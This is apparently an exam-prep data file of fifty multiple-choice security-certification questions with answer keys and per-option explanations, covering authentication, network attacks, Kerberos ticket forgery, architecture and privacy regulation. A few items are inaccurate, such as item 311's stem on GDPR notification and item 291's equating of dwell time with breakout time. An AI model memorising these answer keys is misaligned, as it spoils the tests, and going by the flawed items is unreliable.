  {id:276,domain:G,question:"What is the difference between synchronous and asynchronous encryption?",options:["Synchronous and asynchronous encryption are interchangeable terms both describing symmetric block cipher algorithms that operate on fixed-length data blocks","Synchronous encryption uses a shared clock signal synchronized between sender and receiver, while asynchronous encryption transmits data with start and stop framing bits","Synchronous encryption refers to stream ciphers that operate in sync with a clock/keystream; asynchronous is not a standard cryptographic term","Asynchronous encryption consistently achieves higher throughput and performance than synchronous algorithms by eliminating the need for keystream clock synchronization"],answer:2,explanation:"In some contexts, synchronous stream ciphers maintain an independent keystream; 'asynchronous' is not standard terminology in cryptography.",optionExplanations:["They are not interchangeable standard terms; synchronous refers to stream ciphers synchronized with a keystream, while asynchronous is not a recognized standard cryptographic classification.","This conflates data transmission terminology with cryptographic modes; synchronous in cryptography refers to stream ciphers tied to a keystream, not clock signaling between parties.","Synchronous stream ciphers generate keystreams independently; asynchronous is not a standardized cryptographic term.","Asynchronous is not a standard cryptographic performance category; performance differences exist between stream and block ciphers, but asynchronous encryption is not a recognized cryptographic term."]},
  {id:277,domain:G,question:"What is the purpose of a TPM (Trusted Platform Module)?",options:["Authenticate remote network users through RADIUS or TACACS+ challenge-response protocols managed by a centralized network access server","A hardware chip that stores cryptographic keys and enables platform integrity measurement","Protect data transmitted between client devices and network gateways using TLS encryption negotiated through a security appliance","Scan fingerprints or capture facial geometry to verify user identity through biometric authentication before granting system access"],answer:1,explanation:"A TPM securely stores encryption keys, performs cryptographic operations, and attests to the integrity of the boot process.",optionExplanations:["RADIUS/TACACS+ provide network authentication via dedicated servers; a TPM is a local hardware chip on the device itself that stores keys and provides platform integrity measurement.","The TPM is a dedicated security chip providing secure key storage, random number generation, and secure boot attestation.","TLS encryption protects network traffic using software protocols; a TPM is a hardware chip that stores cryptographic keys and measures system integrity at the platform level.","Biometric readers are user verification sensors; a TPM is a hardware security chip that stores keys and measures platform integrity to detect boot-level tampering, not identify users biometrically."]},
  {id:278,domain:G,question:"Which type of encryption is used in HTTPS for the initial key exchange?",options:["Symmetric encryption","Asymmetric encryption","Hashing","No encryption during handshake"],answer:1,explanation:"TLS uses asymmetric encryption (RSA or ECDHE) during the handshake to securely exchange the symmetric session key.",optionExplanations:["Symmetric encryption is used after the handshake for bulk data; asymmetric secures the key exchange.","Asymmetric encryption (or key agreement) establishes the shared symmetric session key during the TLS handshake.","Hashing provides integrity (HMAC) in TLS; it does not establish the session key.","TLS always encrypts the handshake parameters; the entire session is encrypted."]},
  {id:279,domain:G,question:"What is a supplicant in 802.1X authentication?",options:["The RADIUS server that authenticates users","The switch or AP that forwards authentication traffic","The client device requesting network access","The certificate authority issuing client certificates"],answer:2,explanation:"In 802.1X, the supplicant is the client (user's device) requesting access; the authenticator is the switch/AP; the auth server is RADIUS.",optionExplanations:["The RADIUS server is the authentication server, not the supplicant.","The switch or wireless AP is the authenticator (the middle component), not the supplicant.","The supplicant is the client device requesting network access through the 802.1X framework.","The CA issues certificates used by the supplicant and auth server; it is not a role in the 802.1X exchange."]},
  {id:280,domain:G,question:"What is a session key?",options:["A permanent encryption key stored in an HSM","A temporary symmetric key created for a single communication session","A key used to sign digital certificates","The private key of a PKI certificate"],answer:1,explanation:"Session keys are ephemeral symmetric keys negotiated for each session, providing both speed (symmetric) and forward secrecy (temporary).",optionExplanations:["Permanent keys in HSMs are long-term keys; session keys are temporary.","A session key is a temporary symmetric key generated fresh for each session, ensuring efficient encryption and forward secrecy.","Certificate signing uses the CA's private key; session keys encrypt session data.","A PKI private key is the long-term asymmetric key; session keys are symmetric and ephemeral."]},
  {id:281,domain:T,question:"What is an ARP spoofing attack?",options:["Intercepting DNS queries","Sending fake ARP messages to associate the attacker's MAC address with a legitimate IP","Flooding a switch with MAC addresses","Impersonating a DHCP server"],answer:1,explanation:"ARP spoofing poisons ARP caches on the LAN so traffic destined for a legitimate IP is sent to the attacker's MAC address.",optionExplanations:["Intercepting DNS queries is DNS spoofing, a different attack.","ARP spoofing sends gratuitous ARP replies linking the attacker's MAC to a victim's IP, enabling traffic interception.","Flooding a switch with MACs is a MAC flooding attack to force it into hub mode.","Impersonating a DHCP server is a DHCP spoofing attack."]},
  {id:282,domain:T,question:"What is a MAC flooding attack?",options:["Sending malware via network packets","Overwhelming a switch's MAC address table to force it to broadcast all frames","Spoofing MAC addresses for authentication bypass","Intercepting wireless MAC authentication"],answer:1,explanation:"MAC flooding exhausts the CAM table, causing the switch to flood all traffic to all ports like a hub, enabling eavesdropping.",optionExplanations:["Network packet malware delivery is different from MAC flooding.","MAC flooding sends massive quantities of frames with fake MACs, filling the CAM table and causing the switch to forward all traffic to all ports.","MAC address spoofing changes a device's MAC for impersonation; MAC flooding overwhelms the switch table.","Wireless MAC filtering bypass uses MAC spoofing; MAC flooding targets wired switch CAM tables."]},
  {id:283,domain:T,question:"What is DHCP spoofing?",options:["Flooding the DHCP server with requests","An attacker acting as a rogue DHCP server to assign clients false network settings including a malicious gateway","Blocking DHCP traffic with a firewall","Scanning for DHCP servers on the network"],answer:1,explanation:"A rogue DHCP server assigns attacker-controlled gateway IPs, routing all client traffic through the attacker.",optionExplanations:["Flooding the DHCP server is a DHCP starvation attack; DHCP spoofing involves serving false configuration.","DHCP spoofing places an attacker-controlled server to distribute false gateway/DNS settings, enabling traffic interception.","Blocking DHCP traffic is a firewall or DHCP snooping function, not an attack.","Scanning for DHCP servers is reconnaissance, not spoofing."]},
  {id:284,domain:T,question:"What is an SSL stripping attack?",options:["Removing SSL certificates from a server","Downgrading an HTTPS connection to HTTP by intercepting the initial redirect","Stealing SSL private keys","Replacing an SSL certificate with a self-signed one"],answer:1,explanation:"SSL stripping intercepts the HTTP-to-HTTPS redirect and maintains an unencrypted connection with the victim while HTTPS is used with the server.",optionExplanations:["Removing certificates from servers would break HTTPS; SSL stripping is an active interception attack.","SSL stripping intercepts the HTTP redirect to HTTPS, maintaining unencrypted communication with the victim while connecting to the server via HTTPS.","Private key theft is a PKI compromise; SSL stripping doesn't require obtaining keys.","Certificate substitution is a MITM via fraudulent certificates; SSL stripping avoids encryption entirely for the victim connection."]},
  {id:285,domain:T,question:"Which of the following BEST describes a cross-site scripting (XSS) attack?",options:["Injecting SQL commands into web form fields","Injecting malicious scripts into web pages that execute in other users' browsers","Intercepting traffic between web servers","Exploiting a buffer overflow in a web server"],answer:1,explanation:"XSS injects client-side scripts (JavaScript) into pages served to other users, executing in their browser's security context.",optionExplanations:["SQL injection targets database queries; XSS targets the browser's script execution.","XSS embeds malicious JavaScript into web pages, executing in victims' browsers to steal cookies, redirect, or perform actions.","Traffic interception is MITM; XSS is an injection attack at the application layer.","Buffer overflows target server memory; XSS targets client browsers through injected scripts."]},
  {id:286,domain:A,question:"What is a security zone in network architecture?",options:["A geographic area where security cameras are deployed","A defined network segment with specific trust level and associated security controls","A VLAN reserved for security tools","A subnet for DMZ servers only"],answer:1,explanation:"Security zones partition the network by trust level (trusted, untrusted, DMZ) and apply appropriate controls at zone boundaries.",optionExplanations:["Camera deployment areas are physical security zones; network security zones are logical partitions.","Security zones define trust levels for network segments with firewalls and controls enforced at zone boundaries.","VLANs for security tools are a configuration detail; security zones are an architectural concept.","DMZ is one type of security zone; others include trusted internal, untrusted external, and partner zones."]},
  {id:287,domain:A,question:"What is the purpose of subnetting in network security?",options:["Increase network speed","Divide a large network into smaller, more manageable and isolated segments","Provide wireless access","Assign MAC addresses to devices"],answer:1,explanation:"Subnetting creates smaller network segments that limit broadcast domains and can restrict traffic flow between segments.",optionExplanations:["Subnetting doesn't directly increase speed; it improves manageability and security through isolation.","Subnetting divides large IP address spaces into smaller segments, reducing broadcast domains and enabling traffic control.","Wireless access is provided by access points; subnetting is IP network segmentation.","MAC addresses are burned into hardware (Layer 2); IP subnetting operates at Layer 3."]},
  {id:288,domain:A,question:"What is the role of an HSM in a PKI?",options:["Issue digital certificates to end users","Securely generate and store the CA's private key, protecting it from extraction","Provide a web portal for certificate requests","Revoke compromised certificates"],answer:1,explanation:"An HSM stores the CA's private key in tamper-resistant hardware, ensuring it cannot be extracted even if the CA server is compromised.",optionExplanations:["Certificate issuance is the CA software function; the HSM just protects the private key used to sign them.","An HSM provides hardware protection for the CA's private key, making it resistant to extraction and software-based attacks.","Certificate request portals (web interfaces) are CA application features, not HSM functions.","Certificate revocation is managed by the CA software through CRLs and OCSP; the HSM protects the signing key."]},
  {id:289,domain:A,question:"What is meant by 'resilience' in security architecture?",options:["The ability to prevent all attacks","The ability to continue operating and recover quickly despite attacks, failures, or disasters","Using redundant security tools","Having the fastest possible systems"],answer:1,explanation:"Security resilience means systems can withstand or recover from disruptions without unacceptable loss of functionality.",optionExplanations:["No architecture can prevent all attacks; resilience focuses on surviving and recovering from them.","Resilience is the capacity to absorb disruptions, maintain essential functions, and recover with minimal impact.","Redundant tools contribute to resilience but are not its complete definition.","Speed matters for performance; resilience is about continuity and recovery."]},
  {id:290,domain:A,question:"What is the purpose of a web application firewall (WAF)?",options:["Filter network traffic at Layer 3","Inspect and filter HTTP/S traffic to protect web applications from attacks like SQLi and XSS","Provide SSL/TLS encryption for web servers","Monitor server performance"],answer:1,explanation:"A WAF analyzes HTTP/S requests and responses against security policies to block web application attacks.",optionExplanations:["Layer 3 filtering is done by traditional firewalls using IP addresses; WAFs operate at Layer 7.","WAFs inspect HTTP application traffic, detecting and blocking OWASP Top 10 attacks including SQLi, XSS, and CSRF.","SSL/TLS encryption is provided by the server or load balancer's TLS configuration; WAFs may perform TLS offloading.","Server performance monitoring is done by APM tools; WAFs focus on security inspection of application traffic."]},
  {id:291,domain:O,question:"What is the concept of 'dwell time' in security?",options:["The time a security analyst spends investigating an alert","The length of time an attacker remains undetected inside a network after compromising it","The time it takes to recover from an incident","The duration of a security audit"],answer:1,explanation:"Dwell time (breakout time) is how long attackers lurk undetected; reducing it is a key goal of threat hunting and detection.",optionExplanations:["Analyst investigation time is MTTR-related; dwell time is about attacker persistence before detection.","Dwell time measures how long an attacker has been inside the network without being detected — a key indicator of detection effectiveness.","Recovery time is measured by MTTR; dwell time is pre-detection persistence.","Audit duration is a planning parameter; dwell time is a security metric."]},
  {id:292,domain:O,question:"What is the purpose of threat modeling?",options:["Scan systems for vulnerabilities","Identify and prioritize potential threats against a system or application during the design phase","Train developers in secure coding","Deploy firewalls based on identified threats"],answer:1,explanation:"Threat modeling (STRIDE, PASTA, LINDDUN) systematically identifies threats early in design to guide security controls.",optionExplanations:["Vulnerability scanning tests live systems; threat modeling is a design-time analysis activity.","Threat modeling analyzes potential adversaries, threats, and weaknesses during design to enable proactive security controls.","Secure coding training is security education; threat modeling is a structured analysis methodology.","Firewall deployment results from threat model findings; the threat model itself is the analysis process."]},
  {id:293,domain:O,question:"What is the purpose of a security kernel?",options:["The core security component of a hardware security module","A minimal, trusted portion of an OS that implements and enforces all security policies","A vulnerability in the OS kernel","A dedicated server running security tools"],answer:1,explanation:"A security kernel is the smallest, most trusted portion of an OS — typically the TCB — that enforces all access control decisions.",optionExplanations:["HSM hardware components are not called security kernels.","The security kernel is the trusted core of an OS that implements mandatory security policies and cannot be bypassed.","A kernel vulnerability is a CVE in OS code; a security kernel is a security architecture concept.","A dedicated security server runs tools; a security kernel is an OS design concept."]},
  {id:294,domain:O,question:"What is the difference between active and passive vulnerability scanning?",options:["Active scans are manual; passive are automated","Active scanning probes systems directly; passive scanning analyzes captured network traffic without direct probing","Active scans find more vulnerabilities; passive finds fewer","Passive scans are invasive; active scans are not"],answer:1,explanation:"Active scanning sends probes to systems; passive scanning observes traffic to infer vulnerabilities without touching target systems.",optionExplanations:["Both active and passive scanning can be automated.","Active scanning directly queries systems (Nessus, OpenVAS); passive scanning observes traffic without touching targets.","Both types can find significant vulnerabilities; coverage differs by type.","Active scanning can be invasive (it probes systems); passive scanning is non-invasive."]},
  {id:295,domain:O,question:"What is a vulnerability scoring system (CVSS)?",options:["A list of all known CVEs","A standardized framework for rating the severity of vulnerabilities using metrics like exploitability and impact","A database of vendor patch releases","A tool for scanning systems for vulnerabilities"],answer:1,explanation:"CVSS (Common Vulnerability Scoring System) provides 0-10 severity scores based on exploitability, scope, and impact metrics.",optionExplanations:["The CVE list catalogs vulnerabilities by ID; CVSS scores their severity.","CVSS assigns a numeric severity score based on factors like attack vector, complexity, privileges required, and impact.","Patch databases track vendor releases; CVSS scores severity of the vulnerabilities they address.","Scanning tools like Nessus report CVSS scores but are not the scoring system itself."]},
  {id:296,domain:P,question:"What is a system security plan (SSP)?",options:["A daily security monitoring schedule","A formal document describing a system's security requirements, controls, and their implementation","A software testing plan","A backup recovery procedure"],answer:1,explanation:"An SSP (required by NIST and FISMA) documents a system's security environment, control implementations, and responsibilities.",optionExplanations:["Monitoring schedules are operational procedures; an SSP is a comprehensive security documentation artifact.","An SSP documents security controls implemented on a system, their status, responsible parties, and operational environment.","Software test plans describe testing approaches for software quality; SSPs document security control implementation.","Backup procedures are disaster recovery documents; an SSP is a security documentation requirement."]},
  {id:297,domain:P,question:"What is the purpose of an audit trail in security?",options:["Prevent unauthorized access","A chronological record of events and actions enabling accountability and forensic investigation","Encrypt activity logs","Automatically respond to security events"],answer:1,explanation:"An audit trail is an immutable log of events providing accountability, supporting investigations and demonstrating compliance.",optionExplanations:["Preventing unauthorized access is the role of access controls; audit trails record what happened.","An audit trail records who did what, when, and from where — providing accountability and forensic reconstruction.","Log encryption is a protective control for the audit trail itself; the trail is the record.","Automated response is SOAR; audit trails are the evidence record used to inform response."]},
  {id:298,domain:P,question:"What is the concept of 'privacy by design'?",options:["Adding privacy controls after a system is built","Incorporating privacy protections into systems from the initial design phase rather than as an afterthought","Encrypting all personal data","Conducting annual privacy audits"],answer:1,explanation:"Privacy by design (Ann Cavoukian) integrates privacy as a core requirement from the start, not bolted on later.",optionExplanations:["Adding privacy controls after building a system is 'privacy by retrofit,' which is less effective.","Privacy by design embeds privacy principles (data minimization, purpose limitation) into architecture from the beginning.","Encryption is one privacy technical control; privacy by design is a holistic design philosophy.","Annual audits are compliance verification; privacy by design is about proactive integration of privacy."]},
  {id:299,domain:P,question:"What does the term 'data sovereignty' mean?",options:["The right to access any data on the internet","Data is subject to the laws and governance of the country where it is stored or processed","Organizations own all data they collect","Data must be encrypted regardless of location"],answer:1,explanation:"Data sovereignty means data stored in a country is subject to that country's laws, affecting where organizations can store data.",optionExplanations:["Internet access rights are a separate concept; data sovereignty is about legal jurisdiction.","Data sovereignty recognizes that data stored in a country falls under that nation's legal jurisdiction and regulations.","Data ownership rights depend on contracts and privacy law; data sovereignty is about legal jurisdiction.","Encryption requirements vary by regulation; data sovereignty is about jurisdictional control, not encryption specifically."]},
  {id:300,domain:P,question:"What is a security charter?",options:["A firewall rule set","A document defining the authority, scope, responsibilities, and goals of the security program","A penetration test authorization form","A network security policy"],answer:1,explanation:"A security charter grants the CISO and security program formal authority, defines scope, and establishes organizational accountability.",optionExplanations:["Firewall rule sets are technical access control documents; a charter establishes organizational authority.","A security charter formalizes the security program's mandate, authority, and responsibilities within the organization.","Pen test authorization is a rules of engagement document; a charter is a broader program mandate.","Security policies define rules; a charter establishes the program's authority to create and enforce those policies."]},
  {id:301,domain:G,question:"What is the purpose of a time-based one-time password (TOTP)?",options:["Replace all other authentication methods","Generate a short-lived password based on the current time and a shared secret, valid for ~30 seconds","Store passwords securely in the cloud","Provide single sign-on capabilities"],answer:1,explanation:"TOTP (RFC 6238) generates a new 6-digit code every 30 seconds using HMAC-SHA1 and the current timestamp.",optionExplanations:["TOTP is typically used as a second factor, not a replacement for all authentication.","TOTP combines the current Unix time with a shared secret using HMAC to generate a short-lived code.","Password storage is handled by password managers and vaults; TOTP generates temporary codes.","SSO allows one login across systems; TOTP is a single authentication factor."]},
  {id:302,domain:G,question:"Which of the following BEST describes a hardware OTP token?",options:["A USB drive storing passwords","A physical device that generates one-time passwords without requiring network connectivity","A smart card used for digital signatures","A biometric fingerprint reader"],answer:1,explanation:"Hardware tokens (RSA SecurID, YubiKey OTP) generate time or counter-based OTPs without network or battery in some models.",optionExplanations:["USB drives store files; hardware OTP tokens generate dynamic codes.","Hardware OTP tokens are self-contained devices generating fresh codes for each authentication, independent of network access.","Smart cards store certificates and private keys for digital signatures; OTP tokens generate numeric codes.","Fingerprint readers capture biometric data; OTP tokens are knowledge/possession factors."]},
  {id:303,domain:T,question:"What is a golden ticket attack in Active Directory?",options:["A phishing attack using fake Microsoft emails","Forging a Kerberos TGT using the KRBTGT account hash, granting access to any resource in the domain","A physical access attack on domain controllers","An LDAP injection attack"],answer:1,explanation:"By compromising the KRBTGT hash, attackers create forged TGTs valid for any account and resource, granting domain-wide persistence.",optionExplanations:["Microsoft-themed phishing is a social engineering attack, not a Kerberos attack.","A golden ticket is a forged Kerberos TGT created with the KRBTGT account's NTLM hash, granting unlimited domain access.","Physical DC attacks are separate; golden tickets are forged authentication tokens.","LDAP injection targets directory service queries; golden tickets exploit Kerberos authentication."]},
  {id:304,domain:T,question:"What is a silver ticket attack?",options:["A golden ticket with limited scope","Forging a Kerberos service ticket for a specific service without contacting the KDC","Stealing NTLM hashes from memory","A replay attack against Kerberos"],answer:1,explanation:"Silver tickets forge Kerberos service tickets using a service account's hash, granting access to a specific service without KDC involvement.",optionExplanations:["Silver tickets are related to golden tickets but target specific services, not domain-wide access.","A silver ticket forges a service ticket using the service account hash, enabling access to that specific service without KDC logging.","Stealing NTLM hashes is credential harvesting; silver tickets use those hashes to forge service tickets.","Replay attacks reuse captured authentication data; silver tickets are forged from scratch."]},
  {id:305,domain:T,question:"What is lateral movement in a cyberattack?",options:["Increasing the bandwidth of an attack","Spreading from the initial compromised system to other systems within the network","Exfiltrating data to an external server","Escalating privileges on the initial compromised host"],answer:1,explanation:"Lateral movement uses techniques like pass-the-hash, RDP, and SSH to move from the beachhead to other targets in the network.",optionExplanations:["Bandwidth is a network capacity metric; lateral movement is an attacker technique.","Lateral movement expands the attacker's foothold across the network from the initial compromised system.","Data exfiltration is the final objective; lateral movement is the technique used to reach valuable targets first.","Privilege escalation gains higher access on one system; lateral movement spreads across multiple systems."]},
  {id:306,domain:A,question:"What is micro-segmentation and how does it differ from traditional segmentation?",options:["Micro-segmentation uses smaller VLANs; traditional uses larger ones","Micro-segmentation applies policies at the individual workload level; traditional uses zone-level segmentation with firewalls","They are the same concept","Traditional segmentation uses software; micro-segmentation uses hardware"],answer:1,explanation:"Micro-segmentation enforces policies per workload/VM using software-defined controls, much more granular than VLAN-based zone segmentation.",optionExplanations:["Size of VLANs is not the defining difference.","Micro-segmentation applies security policies to individual workloads or containers, limiting east-west movement far more granularly than traditional zones.","They address the same problem (isolation) at different granularity levels.","Micro-segmentation is typically software-defined; it doesn't require physical hardware per workload."]},
  {id:307,domain:A,question:"What security concern is associated with shadow IT?",options:["IT staff working overtime without authorization","Employees using unauthorized cloud apps or devices, creating uncontrolled risk exposure outside security policies","Unpatched legacy systems","Security software running without management approval"],answer:1,explanation:"Shadow IT bypasses corporate security controls, potentially exposing sensitive data and creating compliance violations.",optionExplanations:["Overtime is an HR matter; shadow IT is unauthorized technology use.","Shadow IT introduces uncontrolled risk because unauthorized apps lack corporate security review, monitoring, and data governance.","Legacy system patches are vulnerability management; shadow IT is about unsanctioned technology adoption.","Security software approval is an IT governance issue; shadow IT encompasses all unauthorized technology use."]},
  {id:308,domain:A,question:"What is the purpose of network flow monitoring (NetFlow)?",options:["Capture complete network packet content","Analyze metadata about network conversations (source/destination, port, bytes, duration) to detect anomalies","Filter malicious network traffic","Encrypt network traffic between devices"],answer:1,explanation:"NetFlow/IPFIX captures flow records (metadata only) enabling traffic pattern analysis and anomaly detection at scale.",optionExplanations:["Full packet capture is done by sniffers like Wireshark; NetFlow captures flow metadata only.","NetFlow records capture traffic metadata — 5-tuple, byte counts, timestamps — enabling anomaly detection without storing full packets.","Traffic filtering is done by firewalls and IPS; NetFlow is a monitoring and analysis tool.","Traffic encryption is done by protocols like TLS; NetFlow analyzes the resulting traffic patterns."]},
  {id:309,domain:O,question:"What is the purpose of endpoint hardening?",options:["Install more applications on endpoints","Remove unnecessary services, disable unused ports, and configure security settings to minimize the attack surface","Add more users to administrator groups","Increase endpoint performance"],answer:1,explanation:"Endpoint hardening reduces attack surface by removing default accounts, disabling unneeded services, and applying security baselines.",optionExplanations:["Installing more applications increases attack surface; hardening reduces it.","Endpoint hardening applies CIS benchmark configurations — disabling unused services, restricting privileges, enabling logging.","Adding users to admin groups violates least privilege; hardening enforces minimum necessary access.","Hardening may reduce performance slightly; security takes priority."]},
  {id:310,domain:O,question:"What is a known-good baseline in security?",options:["A list of known malware signatures","A documented snapshot of a system's normal, secure state used for comparison to detect changes","The highest security configuration possible","A network topology diagram"],answer:1,explanation:"A known-good baseline enables integrity monitoring — any deviation indicates unauthorized change or compromise.",optionExplanations:["Malware signatures are detection databases; a baseline documents normal system state.","A known-good baseline captures expected system configuration, files, and behavior to detect unauthorized modifications.","Maximum security configuration is a hardening target; a baseline is the documented normal state.","Network topology documents network connections; a system baseline documents system configuration state."]},
  {id:311,domain:P,question:"Which regulation requires organizations to report data breaches to affected individuals within 72 hours?",options:["HIPAA","PCI DSS","GDPR","SOX"],answer:2,explanation:"GDPR Article 33 requires notifying the supervisory authority within 72 hours of becoming aware of a data breach.",optionExplanations:["HIPAA breach notification requires notification to individuals within 60 days; supervisory authority within 72 hours is GDPR.","PCI DSS requires incident reporting to card brands but does not specify a 72-hour timeline to individuals.","GDPR requires supervisory authority notification within 72 hours and individual notification without undue delay.","SOX focuses on financial reporting accuracy for publicly traded companies, not data breach notification timelines."]},
  {id:312,domain:P,question:"What is the purpose of a data processing agreement (DPA)?",options:["License software for data analytics","A legally binding contract governing how a data processor handles personal data on behalf of a controller","An internal policy for data retention","A technical specification for data encryption"],answer:1,explanation:"DPAs (required under GDPR) define the processor's obligations for processing personal data on behalf of the controller.",optionExplanations:["Software licensing is handled by EULAs and software contracts; DPAs govern data processing relationships.","A DPA establishes legal obligations between data controllers and processors, required by GDPR for all processing relationships.","Internal data retention policies are administrative documents; DPAs are binding contracts with third parties.","Technical encryption specs are implementation standards; DPAs define legal obligations and responsibilities."]},
  {id:313,domain:P,question:"What is the concept of 'data minimization' in privacy?",options:["Using smaller data files to save storage","Collecting only the minimum personal data necessary for the specified purpose","Deleting data after processing","Encrypting personal data"],answer:1,explanation:"Data minimization (a GDPR principle) means collecting only what is strictly necessary, reducing privacy risk.",optionExplanations:["File size reduction is data compression; data minimization is about limiting collection scope.","Data minimization collects only data that is adequate, relevant, and limited to what is necessary for the stated purpose.","Data deletion is related to retention limits; minimization is about limiting collection from the start.","Encryption protects data; minimization reduces the amount of data at risk."]},
  {id:314,domain:O,question:"What is a security operations maturity model?",options:["A measure of how many security tools are deployed","A framework assessing the sophistication and effectiveness of a security operations program across capability levels","A list of security certifications held by the team","A benchmark for security tool performance"],answer:1,explanation:"SOC maturity models (like the SOC-CMM) assess capabilities from ad hoc (Level 1) to optimized, metrics-driven programs (Level 5).",optionExplanations:["Tool count is a vanity metric; maturity measures capability and process sophistication.","Security maturity models assess people, process, and technology capabilities across progressive maturity levels.","Certifications held by staff are an input; maturity models assess organizational capabilities.","Tool benchmarks measure technical performance; maturity models assess overall program effectiveness."]},
  {id:315,domain:T,question:"What is a living-off-the-land (LotL) attack?",options:["An attack on agricultural systems","Using legitimate system tools (PowerShell, WMI, Certutil) already present on the target to carry out malicious activity","A type of supply chain attack","Hiding malware in environmental data"],answer:1,explanation:"LotL attacks use built-in OS tools to blend in with normal activity, evading detection by not dropping external malware.",optionExplanations:["Agricultural systems are OT/ICS targets; LotL is an endpoint attack technique.","LotL attacks use trusted, pre-installed tools (certutil, mshta, regsvr32) for malicious purposes, evading file-based detection.","Supply chain attacks compromise vendors; LotL uses tools already present on compromised systems.","Environmental data hiding is not a cyberattack category; LotL is about using system tools maliciously."]},
  {id:316,domain:T,question:"What is a pass-the-ticket attack?",options:["A replay attack against web session cookies","Using a stolen Kerberos ticket to authenticate as the ticket's owner without knowing their password","Stealing Kerberos service account passwords","A brute force attack against Kerberos authentication"],answer:1,explanation:"Pass-the-ticket extracts Kerberos tickets from memory (using Mimikatz) and reuses them to authenticate to services.",optionExplanations:["Web session cookie replay is session hijacking; Kerberos tickets are different authentication artifacts.","Pass-the-ticket uses extracted Kerberos TGT or service tickets to authenticate without needing the account password.","Stealing passwords is credential harvesting; pass-the-ticket uses the ticket directly.","Brute force guesses passwords; pass-the-ticket reuses a valid, already-issued ticket."]},
  {id:317,domain:A,question:"What is a network tap?",options:["A firewall rule that copies traffic","A hardware device passively copying all traffic on a network link for monitoring without introducing latency","A wireless access point for testing","A software tool for analyzing PCAP files"],answer:1,explanation:"A network tap passively copies traffic off a link (optical or electrical) to a monitoring device without affecting the original traffic.",optionExplanations:["Firewall rules that copy traffic are port mirroring configurations; a tap is hardware-based.","A network tap is a passive hardware device that copies all traffic on a link to monitoring tools without adding latency or risk of packet loss.","Wireless access points provide network connectivity; taps are physical network monitoring hardware.","PCAP analysis tools (Wireshark) analyze captured traffic; a tap is the hardware that captures it."]},
  {id:318,domain:A,question:"What is SPAN (Switched Port Analyzer)?",options:["A network security protocol","A switch feature that copies traffic from one or more ports to a designated monitoring port","A wireless monitoring tool","A firewall traffic inspection mode"],answer:1,explanation:"SPAN (port mirroring) configures a switch to copy frames from selected ports to a monitoring port for analysis by IDS/sniffers.",optionExplanations:["SPAN is a switch feature, not a network protocol.","SPAN configures a switch to mirror traffic from source ports to a destination monitoring port for network analysis.","Wireless monitoring uses separate tools; SPAN is a wired switch capability.","Firewall inspection analyzes traffic passing through it; SPAN provides a copy of traffic for external analysis."]},
  {id:319,domain:O,question:"What is the purpose of a post-incident review (lessons learned)?",options:["Assign blame for the incident","Analyze what happened, identify what worked and what didn't, and improve processes for the future","Document legal evidence","Close the incident in the ticketing system"],answer:1,explanation:"Post-incident reviews identify root causes, process improvements, and control gaps to strengthen defenses against future incidents.",optionExplanations:["Blame assignment is counterproductive; lessons learned focus on systemic improvements.","Post-incident reviews analyze the timeline, root cause, response effectiveness, and control gaps to improve future response.","Legal evidence documentation is part of chain of custody; lessons learned focus on improvement.","Ticket closure is an administrative step; lessons learned drive meaningful security improvements."]},
  {id:320,domain:O,question:"What is the role of the incident response team (IRT)?",options:["Perform annual penetration tests","Coordinate the technical and managerial response to security incidents from detection through recovery","Manage day-to-day IT operations","Train employees on security awareness"],answer:1,explanation:"The IRT (or CSIRT/CERT) detects, analyzes, contains, eradicates, and recovers from security incidents.",optionExplanations:["Annual pen tests are conducted by red teams or third-party pentesters; IRT handles live incidents.","The incident response team coordinates all aspects of incident handling from initial detection through final recovery and lessons learned.","Day-to-day IT operations are managed by IT operations teams; IRT handles security incidents.","Security awareness training is delivered by HR and the security program; IRT focuses on incident handling."]},
  {id:321,domain:G,question:"What is the purpose of a pre-shared key (PSK) in Wi-Fi security?",options:["Dynamically generate unique keys per user","A shared password used by all devices to authenticate and derive encryption keys for the wireless network","Provide certificate-based authentication","Encrypt only management frames"],answer:1,explanation:"PSK (used in WPA2/WPA3 Personal) is a shared passphrase all devices use; enterprise networks use 802.1X instead.",optionExplanations:["Dynamic unique keys per user require 802.1X enterprise authentication, not PSK.","A PSK is a shared passphrase configured on the AP and all client devices, deriving the encryption key from it.","Certificate-based authentication is used in WPA2/WPA3 Enterprise with 802.1X, not PSK mode.","Management frame protection (802.11w) is separate; PSK protects data frame encryption keys."]},
  {id:322,domain:G,question:"What is the purpose of a Kerberos KDC?",options:["Issue TLS certificates to clients","Issue Ticket Granting Tickets and service tickets enabling authenticated access without transmitting passwords","Manage LDAP directory queries","Provide network address translation"],answer:1,explanation:"The Key Distribution Center (KDC) contains the Authentication Server (AS) and Ticket Granting Server (TGS) for Kerberos.",optionExplanations:["TLS certificates are issued by Certificate Authorities; the KDC issues Kerberos tickets.","The KDC issues TGTs to authenticated users and service tickets for specific services, without ever sending passwords over the network.","LDAP directory services are separate; the KDC uses the directory for account information but has its own ticket-issuing function.","NAT translates IP addresses; the KDC manages cryptographic authentication tickets."]},
  {id:323,domain:T,question:"What is the purpose of network reconnaissance tools like Nmap?",options:["Encrypt network traffic","Discover hosts, open ports, and services on a network for security assessment or attack planning","Block malicious traffic","Provide VPN connectivity"],answer:1,explanation:"Nmap is a network scanner used to discover live hosts, open ports, running services, and OS fingerprints.",optionExplanations:["Nmap does not encrypt traffic; it probes systems to discover what is running.","Nmap discovers network topology, open ports, service versions, and OS details — essential for both defense and offense.","Firewalls and IPS block traffic; Nmap is a discovery tool.","VPN tools create encrypted tunnels; Nmap is a network discovery and scanning tool."]},
  {id:324,domain:T,question:"What is a credential harvesting attack?",options:["Brute forcing login pages","Tricking users into entering their credentials on a fake site or through other means to steal them","Cracking stored password hashes","Generating default credentials for IoT devices"],answer:1,explanation:"Credential harvesting tricks users into submitting credentials to attacker-controlled pages through phishing, fake sites, or malware.",optionExplanations:["Brute force systematically guesses credentials; harvesting tricks users into providing them voluntarily.","Credential harvesting steals credentials through deception (phishing pages, fake login forms) rather than technical cracking.","Hash cracking is an offline attack against stolen password databases; harvesting captures credentials in plaintext.","Default credential generation is a configuration attack; harvesting captures real user credentials."]},
  {id:325,domain:A,question:"What is the purpose of rate limiting in web security?",options:["Speed up web server responses","Restrict the number of requests from a single source in a time window to prevent abuse, DoS, or brute force","Encrypt API responses","Log all incoming requests"],answer:1,explanation:"Rate limiting prevents brute force, credential stuffing, and API abuse by limiting how many requests a client can make per unit time.",optionExplanations:["Rate limiting slows requests from any single source; it does not speed up server responses.","Rate limiting caps request frequency to prevent password brute force, scraping, and API-based DoS attacks.","Response encryption is handled by TLS; rate limiting is about request frequency control.","Logging is done by the web server and SIEM; rate limiting is an active control mechanism."]},
